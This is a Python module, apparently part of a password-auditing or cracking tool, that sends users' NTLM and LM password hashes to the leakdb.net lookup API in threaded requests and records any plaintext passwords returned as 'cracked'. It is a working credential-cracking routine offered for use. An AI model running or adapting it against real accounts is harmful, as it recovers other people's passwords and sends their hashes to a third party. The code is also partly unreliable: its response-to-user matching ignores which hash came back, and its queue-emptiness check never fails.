import json  # response is json
import urllib.request  # web server requests
import urllib.error    # HTTPError handling

from time import sleep  # sleep to rate-limit requests
from queue import Queue  # handle thread response
from threading import Thread  # thread request

# MODULE PURPOSE is to attack NTLM and LM password hashes by looking up the hashed values in an online API at
# http://api.leakdb.net. The returned json if found, will containt the plaintext equivilent of the posted hash.
# Thread is used to make multiple requests. However, the server has a rate-limit and a catch and sleep prevents
# the server from refusing too many rapid request.


def get_url(a_queue, a_url):
    # Pre: a_url is a legitimate URL and a_queue is a Queue for json responses
    # Post 1: request is made to a_url and response is read
    # Post 2: HTTPError printed to console if not first occurence of 429
    # Post 3: response is properly encoded as json_response
    # Post 4: json_response added to a_queue
    # second request
    response = None

    # Post 1: request & response
    try:
        response = urllib.request.urlopen(a_url).read()

    except urllib.error.HTTPError as error:
        # Post 2: rate-limited? retry one then print errors
        if error.code == 429:  # HTTP Rate Limit error 429
            sleep(10)  # sleep 10s
            response = urllib.request.urlopen(a_url).read()  # retry once

        else:
            print(error)  # non-429 HTTP Errors for debugging

    # decode the byte response from and load as json
    json_response = json.loads(response.decode('utf-8'))
    a_queue.put(json_response)


def online_hash_lookup_by_leakedb_api(accounts_list):
    # Intent: check http://api.leakdb.net for each hash stored in accounts_list
    # Precondition: accounts_list has each key as a username and the value
    #               associated with the key is a list of hashed passwords
    # Precondition: able to reach api.leakdb.net over the internet
    # Post condition: ntlm_urls and lm_urls propulated lists of api_urls to get for threadded request
    # Post condition: each url is requested in thread and json respons added to lm_queue or json_queue
    # Post condition: prints the username and crack attempt results to console

    api_urls = []
    json_queue = Queue()

    for each_user in accounts_list:
        # request this each_user ntlm hash from LeakDB API
        api_urls.append('https://api.leakdb.net/?j=%s' % each_user.ntlm)
        api_urls.append('https://api.leakdb.net/?j=%s' % each_user.lm)

    for url in api_urls:
        thread = Thread(target=get_url, args=(json_queue, url))
        thread.start()

    for this_user in accounts_list:
        if json_queue.not_empty:
            json_response = json_queue.get()
            if json_response['found'] == "true":
                this_user.cracked(json_response['hashes'][0]['plaintext'])
                this_user.update_status(
                    "successfully cracked by online lookup")
    return
